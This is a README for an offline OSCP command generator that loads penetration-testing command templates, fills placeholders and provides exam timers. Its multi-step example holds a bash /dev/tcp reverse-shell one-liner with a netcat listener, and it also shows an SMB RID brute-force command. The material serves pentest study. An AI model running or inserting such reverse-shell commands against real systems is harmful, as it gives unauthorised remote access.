
# OSCP Command Generator

A lightweight **offline command reference and generator** designed for **OSCP / penetration testing workflows**.

The tool loads command templates from simple `.txt` files and allows you to:

- Quickly **search and filter commands**
- **Fill placeholders** such as `<target>`, `<user>`, `<password>`
- Accept a single IPv4 address or IPv4 CIDR notation for the Target field, such as `192.168.1.10` or `192.168.1.0/24`
- Copy commands with **one-click clipboard support**
- Group **multi‑step commands automatically**
- Highlight **flags, placeholders, and comments**
- Track **priority commands** during an exam
- Filter commands by **credential usage**, **favorites**, and **priority**
- Use **visual exam timers** (20 / 40 / 90 minutes)

The entire tool runs **client-side only**, meaning:

- No backend required
- Works **offline**
- Can be hosted locally or on GitHub Pages

---

# Functional Requirements

The application provides the following functionality.

## 1. Command Loading

Commands are loaded dynamically from text files located in:

```
/data/
```

A manifest file (`manifest.json`) defines which command files should be loaded.

Each file represents a **category of commands**.

Example:

```
01_Network_Enumeration.txt
02_Web_Enumeration_and_attacks.txt
03_Database_enum.txt
...
```

---

## 2. Command Parsing

Each line in the `.txt` file represents a command entry.

Format:

```
Title: command <placeholders> # explanation; where-it-runs
```

Example:

```
RID Brute: nxc smb <target> -u '' -p '' --rid-brute # enumerate domain users/groups via RID brute-force; kali-machine
```

Parsing rules:

| Component | Description |
|----------|-------------|
Title | Text before the first `:` |
Command | Everything after the first `:` |
Comment | Explanation after `#` |
Execution Context | `; kali-machine` or `; target-machine` |
Placeholders | `<target>`, `<domain>`, `<user>` etc |

---

## 3. Multi-Step Commands

Commands with the **same title** are automatically grouped into a **single command card**.

Example:

```
Reverse shell: nc -lvnp <kaliPort>
Reverse shell: bash -i >& /dev/tcp/<kaliIP>/<kaliPort> 0>&1
```

Result:

```
Reverse shell
1. nc -lvnp <kaliPort>
2. bash -i >& /dev/tcp/<kaliIP>/<kaliPort> 0>&1
```

---

## 4. Priority Commands

Commands that start with `^` are treated as **priority commands**.

Example:

```
^Quick scan: nmap -sC -sV <target>
```

Priority commands:

- Appear **at the top of results**
- Are useful for **exam critical commands**

---

## 5. Placeholder Injection

The sidebar allows users to define values for placeholders.

Example placeholders:

```
<target>
<domain>
<user>
<password>
<dc-ip>
<kali-ip>
```

When a value is entered:

```
nmap -sC -sV <target>
```

becomes:

```
nmap -sC -sV 10.10.10.10
```

The **Target IP (IPv4)** field accepts both a single IPv4 address and IPv4 CIDR notation:

```
192.168.1.10
192.168.1.0/24
```

CIDR notation is supported for `<target>` so subnet-oriented commands can use values like `192.168.1.0/24`. Fields that must represent one host, such as Kali IP and DC IP, remain single IPv4 values only.

When using **Copy Target → DC IP**, a CIDR target is copied as the base IPv4 address without the prefix. For example, `192.168.1.0/24` copies to the DC IP field as `192.168.1.0`.

---

## 6. Search System

The search system performs **instant filtering** without re-rendering the DOM.

Search matches:

- Command text
- Titles
- Comments

This enables extremely fast filtering even with large command sets.

---

## 7. Command Filters

Users can filter commands by:

### Credential Commands

Commands that require credentials.

Example:

```
-u <user> -p <password>
```

### Non-Credential Commands

Commands that can be run **without credentials**.

### Priority Commands

Show only commands marked with `^`.

### Favorites

Users can mark commands as favorites for quick access.

Favorites are stored in **local browser storage**.

---

## 8. Syntax Highlighting

Commands are visually highlighted to improve readability.

Highlight types:

| Element | Example |
|-------|--------|
Placeholder | `<target>` |
Flags | `-sC` |
Operators | `|`, `>`, `&&` |
Comments | `# explanation` |

Numbered steps like `#2` are **not treated as comments**.

---

## 9. Clipboard Support

Each command supports:

- Copy **entire command**
- Copy **individual step**

This allows fast command usage during labs or exams.

---

## 10. Exam Timers

Built-in timers for:

```
20 minutes
40 minutes
90 minutes
```

Timers are:

- Visual only
- No sound alerts
- Designed to support **OSCP exam pacing**

---

# Project Structure

```
OSCP_Command_Generator/
│
├── index.html
│
├── css/
│   └── style.css
│
├── js/
│   ├── main.js
│   ├── parse.js
│   ├── render.js
│   ├── filters.js
│   ├── events.js
│   ├── storage.js
│   ├── state.js
│   └── (other modular utilities)
│
├── data/
│   ├── 01_Network_Enumeration.txt
│   ├── 02_Web_Enumeration_and_attacks.txt
│   ├── 03_Database_enum.txt
│   ├── 04_File_transfer.txt
│   ├── 05_Password_attacks.txt
│   ├── 06_Shells_wordlists.txt
│   ├── 07_Linux_enum_privesc.txt
│   ├── 08_Windows_enum_privesc.txt
│   ├── 09_Tunneling_Port_forwarding.txt
│   ├── 10_Windows_AD.txt
│   ├── 11_Misc.txt
│   └── manifest.json
│
└── README.md
```

---

# Adding New Commands

Commands are added by editing the `.txt` files in the `/data` directory.

Example entry:

```
Nmap full scan: nmap -p- -sC -sV <target> # full TCP scan with service detection; kali-machine
```

Best practices:

- Keep commands **one per line**
- Use **clear titles**
- Include **useful comments**
- Specify **where the command runs**

---

# Creating a New Command Category

1. Create a new `.txt` file inside:

```
/data/
```

Example:

```
12_Kerberos.txt
```

2. Add it to the manifest file:

```
data/manifest.json
```

Example:

```json
{
  "files": [
    "01_Network_Enumeration.txt",
    "02_Web_Enumeration_and_attacks.txt",
    "12_Kerberos.txt"
  ]
}
```

3. Reload the application.

The new category will automatically appear.

---

# Running the Project

Since the project loads files via `fetch`, it must be served via HTTP.

## Python

```
python -m http.server 8000
```

Open:

```
http://localhost:8000
```

---

## Node

```
npx http-server -p 8000
```

---

# Design Philosophy

This project was designed with the following principles:

- **Exam speed over aesthetics**
- **Offline first**
- **Minimal dependencies**
- **Fast DOM filtering**
- **Easy command editing via text files**

The goal is to provide a **rapid command lookup system during penetration testing labs and exams**.

---

# Future Improvements

Potential enhancements:

- Command export
- Markdown command import
- Dark / light theme toggle
- Placeholder profiles
- Auto-detection of credential commands
- OSCP exam workflow presets

---

# License

Personal project for OSCP study and penetration testing workflow optimization.
